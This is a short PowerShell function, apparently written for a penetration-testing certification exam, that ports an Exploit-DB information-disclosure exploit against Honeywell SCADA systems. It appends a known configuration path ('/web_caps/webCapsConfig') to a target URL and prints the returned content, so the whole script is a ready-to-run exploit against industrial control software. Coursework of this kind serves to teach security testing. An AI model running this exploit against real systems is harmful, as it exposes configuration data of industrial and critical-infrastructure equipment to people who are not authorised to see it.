Function Exploit-2{
    
<#
.SYNOPSIS
this script is designed to apply an Exploit from Exploit-DB

.DESCRIPTION
this script is an Exploit(Honeywell Scada System - Information Disclosure) ported from from Exploit-DB : (https://www.exploit-db.com/exploits/44734) using Invoke-WebRequest.


.PARAMETER URL
The URL of the targeted website.


.EXAMPLE
PS C:\> Exploit-2 -URL "http://www.test.com"

.LINK
https://pfpt3223.wordpress.com/2018/12/28/assignment-5/

.NOTES
This script was created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam:
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/

Student ID: PSP-3223
#>
 
param ([parameter (Mandatory = $true)][string]$URL)

#exploit
$exploit = "/web_caps/webCapsConfig"

#set the full URL with Exploit 
$infected_website_URL = $URL + $exploit


#EXPLOITING

# Get the content of the infected page to see the result 
write-host $infected_website_URL -ForegroundColor Yellow
$output = Invoke-WebRequest -Uri $infected_website_URL  | Select-Object -ExpandProperty Content
$output

}
